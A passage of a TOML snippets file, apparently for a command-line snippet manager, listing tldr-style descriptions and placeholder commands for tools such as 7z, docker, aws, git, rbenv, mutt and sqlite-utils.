  command = "r2e add <feed_name> <feed_URI>"
  output = ""

[[snippets]]
  description = "Send new stories to an email address"
  command = "r2e run"
  output = ""

[[snippets]]
  description = "List all feeds"
  command = "r2e list"
  output = ""

[[snippets]]
  description = "Delete a feed at a specified index"
  command = "r2e delete <index>"
  output = ""

[[snippets]]
  description = "Read ASCII data as input and produce a PGM image with pixel values that are an approximation of the "brightness" of the ASCII characters"
  command = "asciitopgm <path/to/input_file> > <path/to/output_file.pgm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "asciitopgm -version"
  output = ""

[[snippets]]
  description = "[a]dd a file or directory to a new or existing archive"
  command = "7z a <path/to/archive.7z> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Encrypt an existing archive (including filenames)"
  command = "7z a <path/to/encrypted.7z> -p<password> -mhe=on <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive preserving the original directory structure"
  command = "7z x <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive to a specific directory"
  command = "7z x <path/to/archive.7z> -o<path/to/output>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive to `stdout`"
  command = "7z x <path/to/archive.7z> -so"
  output = ""

[[snippets]]
  description = "[a]rchive using a specific archive type"
  command = "7z a -t<7z|bzip2|gzip|lzip|tar|zip> <path/to/archive> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "[l]ist the contents of an archive"
  command = "7z l <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "Set the level of compression (higher means more compression, but slower)"
  command = "7z a <path/to/archive.7z> -mx=<0|1|3|5|7|9> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "ghci"
  output = ""

[[snippets]]
  description = "Start a REPL and load the specified Haskell source file"
  command = "ghci <source_file.hs>"
  output = ""

[[snippets]]
  description = "Start a REPL and enable a language option"
  command = "ghci -X<language_option>"
  output = ""

[[snippets]]
  description = "Start a REPL and enable some level of compiler warnings (e.g. `all` or `compact`)"
  command = "ghci -W<warning_level>"
  output = ""

[[snippets]]
  description = "Start a REPL with a colon-separated list of directories for finding source files"
  command = "ghci -i<path/to/directory1:path/to/directory2:...>"
  output = ""

[[snippets]]
  description = "Install a specific version of Node.js"
  command = "nvm install <node_version>"
  output = ""

[[snippets]]
  description = "Use a specific version of Node.js in the current shell"
  command = "nvm use <node_version>"
  output = ""

[[snippets]]
  description = "Set the default Node.js version"
  command = "set nvm_default_version <node_version>"
  output = ""

[[snippets]]
  description = "List all available Node.js versions and highlight the default one"
  command = "nvm list"
  output = ""

[[snippets]]
  description = "Uninstall a given Node.js version"
  command = "nvm uninstall <node_version>"
  output = ""

[[snippets]]
  description = "Interactively initialize deployer in the local path (use a framework template with `--template=template`)"
  command = "dep init"
  output = ""

[[snippets]]
  description = "Deploy an application to a remote host"
  command = "dep deploy <hostname>"
  output = ""

[[snippets]]
  description = "Rollback to the previous working release"
  command = "dep rollback"
  output = ""

[[snippets]]
  description = "Connect to a remote host via ssh"
  command = "dep ssh <hostname>"
  output = ""

[[snippets]]
  description = "List commands"
  command = "dep list"
  output = ""

[[snippets]]
  description = "Run any arbitrary command on the remote hosts"
  command = "dep run ""<command>"""
  output = ""

[[snippets]]
  description = "Display help for a command"
  command = "dep help <command>"
  output = ""

[[snippets]]
  description = "Interactively create a new D project"
  command = "dub init <project_name>"
  output = ""

[[snippets]]
  description = "Non-interactively create a new D project"
  command = "dub init <project_name> -n"
  output = ""

[[snippets]]
  description = "Build and run a D project"
  command = "dub"
  output = ""

[[snippets]]
  description = "Install dependencies specified in a D project's `dub.json` or `dub.sdl` file"
  command = "dub fetch"
  output = ""

[[snippets]]
  description = "Update the dependencies in a D project"
  command = "dub upgrade"
  output = ""

[[snippets]]
  description = "Display help"
  command = "dub --help"
  output = ""

[[snippets]]
  description = "Log a message to syslog"
  command = "logger <message>"
  output = ""

[[snippets]]
  description = "Take input from `stdin` and log to syslog"
  command = "echo <log_entry> | logger"
  output = ""

[[snippets]]
  description = "Send the output to a remote syslog server running at a given port. Default port is 514"
  command = "echo <log_entry> | logger --server <hostname> --port <port>"
  output = ""

[[snippets]]
  description = "Use a specific tag for every line logged. Default is the name of logged in user"
  command = "echo <log_entry> | logger --tag <tag>"
  output = ""

[[snippets]]
  description = "Log messages with a given priority. Default is `user.notice`. See `man logger` for all priority options"
  command = "echo <log_entry> | logger --priority <user.warning>"
  output = ""

[[snippets]]
  description = "Show commits (and their messages) with equivalent commits upstream"
  command = "git cherry -v"
  output = ""

[[snippets]]
  description = "Specify a different upstream and topic branch"
  command = "git cherry <origin> <topic>"
  output = ""

[[snippets]]
  description = "Limit commits to those within a given limit"
  command = "git cherry <origin> <topic> <base>"
  output = ""

[[snippets]]
  description = "Show status across all supported websites for the specified email address"
  command = "holehe <username@example.org>"
  output = ""

[[snippets]]
  description = "Show status for only sites where the specified email address is in use"
  command = "holehe <username@example.org> --only-used"
  output = ""

[[snippets]]
  description = "Store data that you type from the keyboard"
  command = "read <variable>"
  output = ""

[[snippets]]
  description = "Do not let backslash (\\) act as an escape character"
  command = "read -r <variable>"
  output = ""

[[snippets]]
  description = "Read `stdin` and perform an action on every line"
  command = "while read line; do echo ""$line""; done"
  output = ""

[[snippets]]
  description = "Convert an XPM image to a PPM image"
  command = "xpmtoppm <path/to/input_file.xpm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Store the transparency mask of the input image in the specified file"
  command = "xpmtoppm --alphaout <path/to/alpha_file.pbm> <path/to/input_file.xpm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Start a REPL session either with the project or standalone"
  command = "boot repl"
  output = ""

[[snippets]]
  description = "Build a single `uberjar`"
  command = "boot jar"
  output = ""

[[snippets]]
  description = "Generate scaffolding for a new project based on a template"
  command = "boot --dependencies boot/new new --template <template_name> --name <project_name>"
  output = ""

[[snippets]]
  description = "Build for development (if using the boot/new template)"
  command = "boot dev"
  output = ""

[[snippets]]
  description = "Build for production (if using the boot/new template)"
  command = "boot prod"
  output = ""

[[snippets]]
  description = "Display help for a specific task"
  command = "boot <task> --help"
  output = ""

[[snippets]]
  description = "Create a new site"
  command = "gatsby new <site_name>"
  output = ""

[[snippets]]
  description = "Create a new site with a Gatsby 'starter'"
  command = "gatsby new <site_name> <url_of_starter_github_repo>"
  output = ""

[[snippets]]
  description = "Start a live-reloading local development server"
  command = "gatsby develop"
  output = ""

[[snippets]]
  description = "Perform a production build and generate static HTML"
  command = "gatsby build"
  output = ""

[[snippets]]
  description = "Start a local server which serves the production build"
  command = "gatsby serve"
  output = ""

[[snippets]]
  description = "Open the specified mailbox"
  command = "mutt -f <mailbox>"
  output = ""

[[snippets]]
  description = "Send an email and specify a subject and a cc recipient"
  command = "mutt -s <subject> -c <cc@example.com> <recipient@example.com>"
  output = ""

[[snippets]]
  description = "Send an email with files attached"
  command = "mutt -a <file1> <file2> -- <recipient@example.com>"
  output = ""

[[snippets]]
  description = "Specify a file to include as the message body"
  command = "mutt -i <path/to/file> <recipient@example.com>"
  output = ""

[[snippets]]
  description = "Specify a draft file containing the header and the body of the message, in RFC 5322 format"
  command = "mutt -H <path/to/file> <recipient@example.com>"
  output = ""

[[snippets]]
  description = "Delete a specific submodule"
  command = "git delete-submodule <path/to/submodule>"
  output = ""

[[snippets]]
  description = "Temporarily stop the execution of a virtual machine"
  command = "VBoxManage controlvm <uuid|vm_name> pause"
  output = ""

[[snippets]]
  description = "Resume the execution of a paused virtual machine"
  command = "VBoxManage controlvm <uuid|vm_name> resume"
  output = ""

[[snippets]]
  description = "Perform a cold reset on the virtual machine"
  command = "VBoxManage controlvm <uuid|vm_name> reset"
  output = ""

[[snippets]]
  description = "Poweroff a virtual machine with the same effect as pulling the power cable of a computer"
  command = "VBoxManage controlvm <uuid|vm_name> poweroff"
  output = ""

[[snippets]]
  description = "Shutdown the virtual machine and save its current state"
  command = "VBoxManage controlvm <uuid|vm_name> savestate"
  output = ""

[[snippets]]
  description = "Send an ACPI (Advanced Configuration and Power Interface) shutdown signal to the virtual machine"
  command = "VBoxManage controlvm <uuid|vm_name> acpipowerbutton"
  output = ""

[[snippets]]
  description = "Send command to reboot itself to the guest OS"
  command = "VBoxManage controlvm <uuid|vm_name> reboot"
  output = ""

[[snippets]]
  description = "Shutdown down the virtual machine without saving its state"
  command = "VBoxManage controlvm <uuid|vm_name> shutdown"
  output = ""

[[snippets]]
  description = "Show available commands and flags"
  command = "hcloud"
  output = ""

[[snippets]]
  description = "Display help"
  command = "hcloud -h"
  output = ""

[[snippets]]
  description = "Show available commands and flags for `hcloud` contexts"
  command = "hcloud context"
  output = ""

[[snippets]]
  description = "Configure AWS CLI interactively (creates a new configuration or updates the default)"
  command = "aws configure"
  output = ""

[[snippets]]
  description = "Configure a named profile for AWS CLI interactively (creates a new profile or updates an existing one)"
  command = "aws configure --profile <profile_name>"
  output = ""

[[snippets]]
  description = "Display the value from a specific configuration variable"
  command = "aws configure get <name>"
  output = ""

[[snippets]]
  description = "Display the value for a configuration variable in a specific profile"
  command = "aws configure get <name> --profile <profile_name>"
  output = ""

[[snippets]]
  description = "Set the value of a specific configuration variable"
  command = "aws configure set <name> <value>"
  output = ""

[[snippets]]
  description = "Set the value of a configuration variable in a specific profile"
  command = "aws configure set <name> <value> --profile <profile_name>"
  output = ""

[[snippets]]
  description = "List the configuration entries"
  command = "aws configure list"
  output = ""

[[snippets]]
  description = "List the configuration entries for a specific profile"
  command = "aws configure list --profile <profile_name>"
  output = ""

[[snippets]]
  description = "Optimise a set of JPEG images, retaining all associated data"
  command = "jpegoptim <image1.jpeg> <image2.jpeg> <imageN.jpeg>"
  output = ""

[[snippets]]
  description = "Optimise JPEG images, stripping all non-essential data"
  command = "jpegoptim --strip-all <image1.jpeg> <image2.jpeg> <imageN.jpeg>"
  output = ""

[[snippets]]
  description = "Force the output images to be progressive"
  command = "jpegoptim --all-progressive <image1.jpeg> <image2.jpeg> <imageN.jpeg>"
  output = ""

[[snippets]]
  description = "Force the output images to have a fixed maximum filesize"
  command = "jpegoptim --size=<250k> <image1.jpeg> <image2.jpeg> <imageN.jpeg>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr fossil-commit"
  output = ""

[[snippets]]
  description = "Generate a `CREATE TABLE` SQL statement for a CSV file"
  command = "csvsql <path/to/data.csv>"
  output = ""

[[snippets]]
  description = "Import a CSV file into an SQL database"
  command = "csvsql --insert --db ""<mysql://user:password@host/database>"" <data.csv>"
  output = ""

[[snippets]]
  description = "Run an SQL query on a CSV file"
  command = "csvsql --query ""<select * from 'data'>"" <data.csv>"
  output = ""

[[snippets]]
  description = "Recompress a directory of FLAC files"
  command = "reflac <path/to/directory>"
  output = ""

[[snippets]]
  description = "Enable maximum compression (very slow)"
  command = "reflac --best <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display filenames as they are processed"
  command = "reflac --verbose <path/to/directory>"
  output = ""

[[snippets]]
  description = "Recurse into subdirectories"
  command = "reflac --recursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Preserve file modification times"
  command = "reflac --preserve <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "ionic start"
  output = ""

[[snippets]]
  description = "Start a local dev server for app dev/testing"
  command = "ionic serve"
  output = ""

[[snippets]]
  description = "Generate new app component, directive, page, pipe, provider or tabs"
  command = "ionic g <page>"
  output = ""

[[snippets]]
  description = "Run app on an Android/iOS device"
  command = "ionic cordova run <android|ios> --device"
  output = ""

[[snippets]]
  description = "Check the health of an Ionic app"
  command = "ionic doctor <check>"
  output = ""

[[snippets]]
  description = "Display versions of Ionic, Cordova, environment, etc."
  command = "ionic info"
  output = ""

[[snippets]]
  description = "Configure a bucket as a static website"
  command = "aws s3 website <s3://bucket-name> --index-document <index.html>"
  output = ""

[[snippets]]
  description = "Configure an error page for the website"
  command = "aws s3 website <s3://bucket-name> --index-document <index.html> --error-document <error.html>"
  output = ""

[[snippets]]
  description = "Clean capture and save only the 4-way handshake and a beacon in the result"
  command = "wpaclean <path/to/result.cap> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Clean multiple captures and save 4-way handshakes and beacons in the result"
  command = "wpaclean <path/to/result.cap> <path/to/capture1.cap path/to/capture2.cap ...>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr ptpython"
  output = ""

[[snippets]]
  description = "Run full benchmark"
  command = "redis-benchmark"
  output = ""

[[snippets]]
  description = "Run benchmark on a specific Redis server"
  command = "redis-benchmark -h <host> -p <port> -a <password>"
  output = ""

[[snippets]]
  description = "Run a subset of tests with default 100000 requests"
  command = "redis-benchmark -h <host> -p <port> -t <set,lpush> -n <100000>"
  output = ""

[[snippets]]
  description = "Run with a specific script"
  command = "redis-benchmark -n <100000> script load ""<redis.call('set', 'foo', 'bar')>"""
  output = ""

[[snippets]]
  description = "Run benchmark by using 100000 [r]andom keys"
  command = "redis-benchmark -t <set> -r <100000>"
  output = ""

[[snippets]]
  description = "Run benchmark by using a [P]ipelining of 16 commands"
  command = "redis-benchmark -n <1000000> -t <set,get> -P <16>"
  output = ""

[[snippets]]
  description = "Run benchmark [q]uietly and only show query per seconds result"
  command = "redis-benchmark -q"
  output = ""

[[snippets]]
  description = "Start `mytop`"
  command = "mytop"
  output = ""

[[snippets]]
  description = "Connect with a specified username and password"
  command = "mytop -u <user> -p <password>"
  output = ""

[[snippets]]
  description = "Connect with a specified username (the user will be prompted for a password)"
  command = "mytop -u <user> --prompt"
  output = ""

[[snippets]]
  description = "Do not show any idle (sleeping) threads"
  command = "mytop -u <user> -p <password> --noidle"
  output = ""

[[snippets]]
  description = "Return BackupPlan details for a specific BackupPlanId"
  command = "aws backup get-backup-plan --backup-plan-id <id>"
  output = ""

[[snippets]]
  description = "Create a backup plan using a specific backup plan name and backup rules"
  command = "aws backup create-backup-plan --backup-plan <plan>"
  output = ""

[[snippets]]
  description = "Delete a specific backup plan"
  command = "aws backup delete-backup-plan --backup-plan-id <id>"
  output = ""

[[snippets]]
  description = "List all active backup plans for the current account"
  command = "aws backup list-backup-plans"
  output = ""

[[snippets]]
  description = "Display details about your report jobs"
  command = "aws backup list-report-jobs"
  output = ""

[[snippets]]
  description = "Log in to a Bitwarden user account"
  command = "bw login"
  output = ""

[[snippets]]
  description = "Log out of a Bitwarden user account"
  command = "bw logout"
  output = ""

[[snippets]]
  description = "Search and display items from Bitwarden vault"
  command = "bw list items --search <github>"
  output = ""

[[snippets]]
  description = "Display a particular item from Bitwarden vault"
  command = "bw get item <github>"
  output = ""

[[snippets]]
  description = "Create a folder in Bitwarden vault"
  command = "<echo -n '{""name"":""My Folder1""}' | base64> | bw create folder"
  output = ""

[[snippets]]
  description = "Set artist and song title tag of an MP3 file"
  command = "id3tag --artist <artist> --song <song_title> <path/to/file.mp3>"
  output = ""

[[snippets]]
  description = "Set album title of all MP3 files in the current directory"
  command = "id3tag --album=<album> <*.mp3>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "id3tag --help"
  output = ""

[[snippets]]
  description = "Launch GnuCash and load the previously opened file"
  command = "gnucash"
  output = ""

[[snippets]]
  description = "Launch GnuCash and load the specified file"
  command = "gnucash <path/to/file.gnucash>"
  output = ""

[[snippets]]
  description = "Launch GnuCash and load an empty file"
  command = "gnucash --nofile"
  output = ""

[[snippets]]
  description = "Index the /usr directory, writing to the default database location ~/.duc.db"
  command = "duc index </usr>"
  output = ""

[[snippets]]
  description = "List all files and directories under /usr/local, showing relative file sizes in a [g]raph"
  command = "duc ls -Fg </usr/local>"
  output = ""

[[snippets]]
  description = "List all files and directories under /usr/local using treeview recursively"
  command = "duc ls -Fg -R </usr/local>"
  output = ""

[[snippets]]
  description = "Start the graphical interface to explore the file system using sunburst graphs"
  command = "duc gui </usr>"
  output = ""

[[snippets]]
  description = "Run the ncurses console interface to explore the file system"
  command = "duc ui </usr>"
  output = ""

[[snippets]]
  description = "Dump database info"
  command = "duc info"
  output = ""

[[snippets]]
  description = "Run a script"
  command = "Rscript <path/to/file.R>"
  output = ""

[[snippets]]
  description = "Run a script in vanilla mode (i.e. a blank session that doesn't save the workspace at the end)"
  command = "Rscript --vanilla <path/to/file.R>"
  output = ""

[[snippets]]
  description = "Execute one or more R expressions"
  command = "Rscript -e <expression1> -e <expression2>"
  output = ""

[[snippets]]
  description = "Display R version"
  command = "Rscript --version"
  output = ""

[[snippets]]
  description = "Connect to an FTP server"
  command = "ftp <ftp.example.com>"
  output = ""

[[snippets]]
  description = "Connect to an FTP server specifying its IP address and port"
  command = "ftp <ip_address> <port>"
  output = ""

[[snippets]]
  description = "Switch to binary transfer mode (graphics, compressed files, etc)"
  command = "binary"
  output = ""

[[snippets]]
  description = "Transfer multiple files without prompting for confirmation on every file"
  command = "prompt off"
  output = ""

[[snippets]]
  description = "Download multiple files (glob expression)"
  command = "mget <*.png>"
  output = ""

[[snippets]]
  description = "Upload multiple files (glob expression)"
  command = "mput <*.zip>"
  output = ""

[[snippets]]
  description = "Delete multiple files on the remote server"
  command = "mdelete <*.txt>"
  output = ""

[[snippets]]
  description = "Rename a file on the remote server"
  command = "rename <original_filename> <new_filename>"
  output = ""

[[snippets]]
  description = "Check the current repository"
  command = "git fsck"
  output = ""

[[snippets]]
  description = "List all tags found"
  command = "git fsck --tags"
  output = ""

[[snippets]]
  description = "List all root nodes found"
  command = "git fsck --root"
  output = ""

[[snippets]]
  description = "Watch a binary file (defaults to `.goreload`)"
  command = "goreload -b <path/to/binary> <path/to/file.go>"
  output = ""

[[snippets]]
  description = "Set a custom log prefix (defaults to `goreload`)"
  command = "goreload --logPrefix <prefix> <path/to/file.go>"
  output = ""

[[snippets]]
  description = "Reload whenever any file changes"
  command = "goreload --all"
  output = ""

[[snippets]]
  description = "Show commits which aren't shared between the currently checked-out branch and another branch"
  command = "git missing <branch>"
  output = ""

[[snippets]]
  description = "Show commits which aren't shared between two branches"
  command = "git missing <branch_1> <branch_2>"
  output = ""

[[snippets]]
  description = "Compile a CUDA program"
  command = "nvcc <path/to/source.cu> -o <path/to/executable>"
  output = ""

[[snippets]]
  description = "Generate debu[g] information"
  command = "nvcc <path/to/source.cu> -o <path/to/executable> --debug --device-debug"
  output = ""

[[snippets]]
  description = "Include libraries from a different path"
  command = "nvcc <path/to/source.cu> -o <path/to/executable> -I<path/to/includes> -L<path/to/library> -l<library_name>"
  output = ""

[[snippets]]
  description = "Specify the compute capability for a specific GPU architecture"
  command = "nvcc <path/to/source.cu> -o <path/to/executable> --generate-code arch=<arch_name>,code=<gpu_code_name>"
  output = ""

[[snippets]]
  description = "Check the status of the specified website"
  command = "is-up <example.com>"
  output = ""

[[snippets]]
  description = "Create a kustomization file with resources and namespace"
  command = "kustomize create --resources <deployment.yaml,service.yaml> --namespace <staging>"
  output = ""

[[snippets]]
  description = "Build a kustomization file and deploy it with `kubectl`"
  command = "kustomize build . | kubectl apply -f -"
  output = ""

[[snippets]]
  description = "Set an image in the kustomization file"
  command = "kustomize edit set image <busybox=alpine:3.6>"
  output = ""

[[snippets]]
  description = "Search for Kubernetes resources in the current directory to be added to the kustomization file"
  command = "kustomize create --autodetect"
  output = ""

[[snippets]]
  description = "Compile binary with gprof information and run it to get `gmon.out`"
  command = "gcc -pg <program.c> && <./a.out>"
  output = ""

[[snippets]]
  description = "Run gprof to obtain profile output"
  command = "gprof"
  output = ""

[[snippets]]
  description = "Suppress profile field's description"
  command = "gprof -b"
  output = ""

[[snippets]]
  description = "Display routines that have zero usage"
  command = "gprof -bz"
  output = ""

[[snippets]]
  description = "Install a Ruby version"
  command = "rbenv install <version>"
  output = ""

[[snippets]]
  description = "Display a list of the latest stable versions for each Ruby"
  command = "rbenv install --list"
  output = ""

[[snippets]]
  description = "Display a list of installed Ruby versions"
  command = "rbenv versions"
  output = ""

[[snippets]]
  description = "Use a specific Ruby version across the whole system"
  command = "rbenv global <version>"
  output = ""

[[snippets]]
  description = "Use a specific Ruby version for an application/project directory"
  command = "rbenv local <version>"
  output = ""

[[snippets]]
  description = "Display the currently selected Ruby version"
  command = "rbenv version"
  output = ""

[[snippets]]
  description = "Uninstall a Ruby version"
  command = "rbenv uninstall <version>"
  output = ""

[[snippets]]
  description = "Display all Ruby versions that contain the specified executable"
  command = "rbenv whence <executable>"
  output = ""

[[snippets]]
  description = "Remove an alias"
  command = "unalias <alias_name>"
  output = ""

[[snippets]]
  description = "Remove all aliases"
  command = "unalias -a"
  output = ""

[[snippets]]
  description = "Visualize SIP packets from a PCAP file"
  command = "sngrep -I <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Visualize only dialogs starting with INVITE packets with RTP packets from a PCAP file"
  command = "sngrep -crI <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Real-time interface with only dialogs starting with INVITE packets with RTP packets"
  command = "sngrep -cr"
  output = ""

[[snippets]]
  description = "Only capture packets without interface to a file"
  command = "sngrep -NO <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker system"
  output = ""

[[snippets]]
  description = "Show docker disk usage"
  command = "docker system df"
  output = ""

[[snippets]]
  description = "Show detailed information on disk usage"
  command = "docker system df --verbose"
  output = ""

[[snippets]]
  description = "Remove unused data"
  command = "docker system prune"
  output = ""

[[snippets]]
  description = "Remove unused data created more than a specified amount of time in the past"
  command = "docker system prune --filter=""until=<hours>h<minutes>m"""
  output = ""

[[snippets]]
  description = "Display real-time events from the Docker daemon"
  command = "docker system events"
  output = ""

[[snippets]]
  description = "Display real-time events from containers streamed as valid JSON Lines"
  command = "docker system events --filter 'type=container' --format '<json .>'"
  output = ""

[[snippets]]
  description = "Display system-wide information"
  command = "docker system info"
  output = ""

[[snippets]]
  description = "Display the list of supported website search scripts (elvi)"
  command = "surfraw -elvi"
  output = ""

[[snippets]]
  description = "Open the elvi's results page for a specific search in the browser"
  command = "surfraw <elvi> ""<search_terms>"""
  output = ""

[[snippets]]
  description = "Display an elvi description and its specific options"
  command = "surfraw <elvi> -local-help"
  output = ""

[[snippets]]
  description = "Search using an elvi with specific options and open the results page in the browser"
  command = "surfraw <elvi> <elvi_options> ""<search_terms>"""
  output = ""

[[snippets]]
  description = "Display the URL to the elvi's results page for a specific search"
  command = "surfraw -print <elvi> ""<search_terms>"""
  output = ""

[[snippets]]
  description = "Search using the alias"
  command = "sr <elvi> ""<search_terms>"""
  output = ""

[[snippets]]
  description = "Send input to a running command"
  command = "pueue send <task_id> ""<input>"""
  output = ""

[[snippets]]
  description = "Send confirmation to a task expecting y/N (e.g. apt, cp)"
  command = "pueue send <task_id> <y>"
  output = ""

[[snippets]]
  description = "Open Irssi and connect to a server with a nickname"
  command = "irssi -n <nickname> -c <irc.example.com>"
  output = ""

[[snippets]]
  description = "Open Irssi and connect with a specific server on a given port"
  command = "irssi -c <irc.example.com> -p <port>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "irssi --help"
  output = ""

[[snippets]]
  description = "Join a channel"
  command = "/join <#channelname>"
  output = ""

[[snippets]]
  description = "Change active window (starts at 1)"
  command = "/win <window_number>"
  output = ""

[[snippets]]
  description = "Exit the application cleanly and quitting any server(s)"
  command = "/quit"
  output = ""

[[snippets]]
  description = "Read a PPM image from the input file, convert it to an Abekas YUV image and store it in the specified output file"
  command = "ppmtoyuv <path/to/input_file.ppm> > <path/to/output_file.yuv>"
  output = ""

[[snippets]]
  description = "Run command in a new container from a tagged image"
  command = "docker run <image:tag> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container in background and display its ID"
  command = "docker run --detach <image> <command>"
  output = ""

[[snippets]]
  description = "Run command in a one-off container in interactive mode and pseudo-TTY"
  command = "docker run --rm --interactive --tty <image> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container with passed environment variables"
  command = "docker run --env '<variable>=<value>' --env <variable> <image> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container with bind mounted volumes"
  command = "docker run --volume </path/to/host_path>:</path/to/container_path> <image> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container with published ports"
  command = "docker run --publish <host_port>:<container_port> <image> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container overwriting the entrypoint of the image"
  command = "docker run --entrypoint <command> <image>"
  output = ""

[[snippets]]
  description = "Run command in a new container connecting it to a network"
  command = "docker run --network <network> <image>"
  output = ""

[[snippets]]
  description = "Count words in a TeX file"
  command = "texcount <path/to/file.tex>"
  output = ""

[[snippets]]
  description = "Count words in a document and subdocuments built with `\input` or `\include`"
  command = "texcount -merge <file.tex>"
  output = ""

[[snippets]]
  description = "Count words in a document and subdocuments, listing each file separately (and a total count)"
  command = "texcount -inc <file.tex>"
  output = ""

[[snippets]]
  description = "Count words with verbose output"
  command = "texcount -v <path/to/file.tex>"
  output = ""

[[snippets]]
  description = "Show the name of the currently active branch"
  command = "hub branch"
  output = ""

[[snippets]]
  description = "Create a new branch"
  command = "hub branch <branch_name>"
  output = ""

[[snippets]]
  description = "Compile a PDF document"
  command = "xetex <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a PDF document, specifying an output directory"
  command = "xetex -output-directory=<path/to/directory> <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a PDF document, exiting if errors occur"
  command = "xetex -halt-on-error <source.tex>"
  output = ""

[[snippets]]
  description = "View documentation for running Transmission's daemon"
  command = "tldr transmission-daemon"
  output = ""

[[snippets]]
  description = "View documentation for interacting with the daemon"
  command = "tldr transmission-remote"
  output = ""

[[snippets]]
  description = "View documentation for creating torrent files"
  command = "tldr transmission-create"
  output = ""

[[snippets]]
  description = "View documentation for modifying torrent files"
  command = "tldr transmission-edit"
  output = ""

[[snippets]]
  description = "View documentation for getting info about torrent files"
  command = "tldr transmission-show"
  output = ""

[[snippets]]
  description = "View documentation for the deprecated method for interacting with the daemon"
  command = "tldr transmission-cli"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "quarto create-project <path/to/destination_directory> --type <book|default|website>"
  output = ""

[[snippets]]
  description = "Create a new blog website"
  command = "quarto create-project <path/to/destination_directory> --type <website> --template <blog>"
  output = ""

[[snippets]]
  description = "Render input file(s) to different formats"
  command = "quarto render <path/to/file.<qmd|rmd|ipynb>> --to <html|pdf|docx>"
  output = ""

[[snippets]]
  description = "Render and preview a document or a website"
  command = "quarto preview <path/to/destination_directory|path/to/file>"
  output = ""

[[snippets]]
  description = "Publish a document or project to Quarto Pub, Github Pages, RStudio Connect or Netlify"
  command = "quarto publish <quarto-pub|gh-pages|connect|netlify>"
  output = ""

[[snippets]]
  description = "Start a synchronization session between a local directory and a remote host"
  command = "mutagen sync create --name=<session_name> </path/to/local/directory/> <user>@<host>:</path/to/remote/directory/>"
  output = ""

[[snippets]]
  description = "Start a synchronization session between a local directory and a Docker container"
  command = "mutagen sync create --name=<session_name> </path/to/local/directory/> docker://<user>@<container_name></path/to/remote/directory/>"
  output = ""

[[snippets]]
  description = "Stop a running session"
  command = "mutagen sync terminate <session_name>"
  output = ""

[[snippets]]
  description = "Start a project"
  command = "mutagen project start"
  output = ""

[[snippets]]
  description = "Stop a project"
  command = "mutagen project terminate"
  output = ""

[[snippets]]
  description = "List running sessions for the current project"
  command = "mutagen project list"
  output = ""

[[snippets]]
  description = "List all installed packages"
  command = "nix-env -q"
  output = ""

[[snippets]]
  description = "Query installed packages"
  command = "nix-env -q <search_term>"
  output = ""

[[snippets]]
  description = "Query available packages"
  command = "nix-env -qa <search_term>"
  output = ""

[[snippets]]
  description = "Install package"
  command = "nix-env -iA nixpkgs.<pkg_name>"
  output = ""

[[snippets]]
  description = "Install a package from a URL"
  command = "nix-env -i <pkg_name> --file <example.com>"
  output = ""

[[snippets]]
  description = "Uninstall package"
  command = "nix-env -e <pkg_name>"
  output = ""

[[snippets]]
  description = "Upgrade one package"
  command = "nix-env -u <pkg_name>"
  output = ""

[[snippets]]
  description = "Upgrade all packages"
  command = "nix-env -u"
  output = ""

[[snippets]]
  description = "Read a PBM image, set its maxval and save it to a file"
  command = "pamdepth <maxval> <path/to/image.pbm> > <path/to/file.pbm>"
  output = ""

[[snippets]]
  description = "View documentation for running the CUPS daemon"
  command = "tldr cupsd"
  output = ""

[[snippets]]
  description = "View documentation for managing printers"
  command = "tldr lpadmin"
  output = ""

[[snippets]]
  description = "View documentation for printing files"
  command = "tldr lp"
  output = ""

[[snippets]]
  description = "View documentation for checking status information about the current classes, jobs, and printers"
  command = "tldr lpstat"
  output = ""

[[snippets]]
  description = "View documentation for cancelling print jobs"
  command = "tldr lprm"
  output = ""

[[snippets]]
  description = "Display the completed import source file"
  command = "goimports <path/to/file.go>"
  output = ""

[[snippets]]
  description = "Write the result back to the source file instead of `stdout`"
  command = "goimports -w <path/to/file.go>"
  output = ""

[[snippets]]
  description = "Display diffs and write the result back to the source file"
  command = "goimports -w -d <path/to/file.go>"
  output = ""

[[snippets]]
  description = "Set the import prefix string after 3rd-party packages (comma-separated list)"
  command = "goimports -local <path/to/package1,path/to/package2,...> <path/to/file.go>"
  output = ""

[[snippets]]
  description = "Create a database"
  command = "sqlite-utils create-database <path/to/database.db>"
  output = ""

[[snippets]]
  description = "Create a table"
  command = "sqlite-utils create-table <path/to/database.db> <table_name> <id integer name text height float photo blob --pk id>"
  output = ""

[[snippets]]
  description = "List tables"
  command = "sqlite-utils tables <path/to/database.db>"
  output = ""

[[snippets]]
  description = "Upsert a record"
  command = "<echo '[ {""id"": 1, ""name"": ""Linus Torvalds""}, {""id"": 2, ""name"": ""Steve Wozniak""}, {""id"": 3, ""name"": ""Tony Hoare""} ]'> | sqlite-utils upsert <path/to/database.db> <table_name> - <--pk id>"
  output = ""

[[snippets]]
  description = "Select records"
